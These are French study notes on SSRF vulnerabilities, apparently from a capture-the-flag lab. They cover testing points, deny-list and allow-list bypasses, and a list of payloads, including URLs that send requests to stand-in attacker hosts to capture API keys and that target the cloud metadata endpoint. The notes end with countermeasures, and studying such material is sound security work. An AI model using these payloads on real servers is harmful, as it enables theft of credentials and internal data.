Une faille **SSRF** apparaît lorsqu’une application web peut être manipulée pour envoyer des requêtes à des destinations arbitraires, contrôlées par l’attaquant.
### 🔹 Exemple concret

- Une appli envoie des SMS via une API externe en utilisant une **clé secrète**.
- Le paramètre `server` est exposé à l’utilisateur.
- Un attaquant peut le modifier pour rediriger la requête vers son propre serveur → il intercepte alors la requête **avec la clé API**.
- Ex. :
    `https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
    Fait que le serveur envoie la requête vers :
    `https://attacker.thm/api/send?msg=ABC`
### 🔹 Risques et usages avancés de SSRF
- **Énumération réseau interne** (IP, ports).
- **Accès à des services internes protégés** via relations de confiance.
- **Interaction avec services non-HTTP** pouvant mener à de l’exécution de code à distance (RCE).
---
## Définition courte
- **SSRF (Server-Side Request Forgery)** : vulnérabilité où une appli côté serveur effectue des requêtes HTTP (ou autres protocoles) vers des ressources contrôlées par un paramètre utilisateur. L’attaquant manipule ce paramètre pour forcer le serveur à contacter des destinations internes ou externes.
---
## Endpoints fréquents à tester

- Paramètre contenant une **URL complète** (`?url=https://example.com/...`)
- **Champ caché** dans un formulaire
- **Hostname partiel** (`?host=internal.api`)
- **Chemin/Path seulement** (`?path=/api/status`)

---
## Blind SSRF
- Si la réponse n’est pas renvoyée (blind), utiliser un outil d’HTTP logging externe pour capter la requête : `requestbin`, serveur HTTP contrôlé, **Burp Collaborator**.
- Tester avec une URL pointant sur ton domaine/logging pour voir si le serveur effectue la requête.

---
## Contournements courants (bypass deny-lists)

**Deny list** = on bloque valeurs spécifiques (ex: `localhost`, `127.0.0.1`) → souvent contournable :
- Variantes d’localhost : `0`, `0.0.0.0`, `0000`, `127.1`, `127.*.*.*`
- Entiers/notations : `2130706433` (127.0.0.1 en déc), `017700000001` (octal)
- Sous-domaines qui résolvent vers 127.0.0.1 (ex. `127.0.0.1.nip.io`)
- DNS controlé : créer un sous-domaine pointant vers `169.254.169.254` (metadata cloud) 
**Allow list** = on n’autorise que certaines valeurs (`https://website.thm`) → contournements :
- **Host chaining / subdomain trick** : `https://website.thm.attacker.com` (si logique de validation naïve)
- **Open redirect** : trouver un endpoint `https://website.thm/link?url=...` qui redirige vers une URL externe ; utiliser cet endpoint comme « pivot » pour amener la requête interne vers ton serveur contrôlé.
---
## Techniques avancées vues dans l’exemple

- **Directory traversal sur path contrôlé** : si l’appli n’autorise que un _path_, jouer avec `../` pour remonter et atteindre `/api/user`.
- **Truc `&x=`** : terminer la charge utile par `&x=` pour éviter que le serveur concatène /attacker-path/rest_of_path à ton URL — ça force le reste à devenir query string et préserve l’URL de l’attaquant telle quelle.
- Capture possible des **headers** envoyés par le serveur interne (potentiellement contenant tokens/API keys).

---

## Payloads utiles (exemples)

- Full URL : `?url=http://attacker.example/setup`
- Localhost numeric: `http://2130706433/` (127.0.0.1 déc)
- Metadata cloud (AWS) : `http://169.254.169.254/latest/meta-data/`
- Subdomain trick: `http://169-254-169-254.attacker.com/` (DNS résolue par attaquant)
- Open redirect pivot: `?url=https://website.thm/redirect?to=http://attacker.example/&x=`

---
## Détection & preuves
- Logs : sorties DNS, logs HTTP du domaine attaquant (RequestBin, Burp Collab).
- Réponses anormales du serveur (timeouts, redirections).
- Requêtes sortantes visibles sur firewall / proxy / egress logs.

---
## Risques
- **Exfiltration de données internes** (metadata cloud, services internes).
- **Authentication theft** : headers (Authorization, cookies, API keys).
- **Pivoting interne** et RCE selon contexte.
- **DoS** si l’attaquant provoque des requêtes lourdes vers les services internes.
---
## Contre-mesures (checklist)

1. **Whitelisting stricte** : n’autoriser que des URLs/prefixes explicites (et vérifier host/IP résolu).
2. **Résolution DNS & validation d’IP** : résoudre et vérifier que l’IP cible n’est **pas** interne (y compris notation déc/octale).
3. **Bloquer egress non nécessaires** (firewall/proxy) vers IP sensibles (`127.0.0.0/8`, `169.254.169.254`, plages internes).
4. **Interdire les redirections non fiables** et valider les open-redirects.
5. **Limiter les protocoles** autorisés (HTTP/HTTPS seulement quand nécessaire).
6. **Logs & monitoring** des requêtes sortantes.
7. **Rate-limiting** et WAF rules pour patterns SSRF (`../`, `127.` encodé...).
8. **Ne pas inclure d’identifiants sensibles** dans headers pour requêtes internes si possible.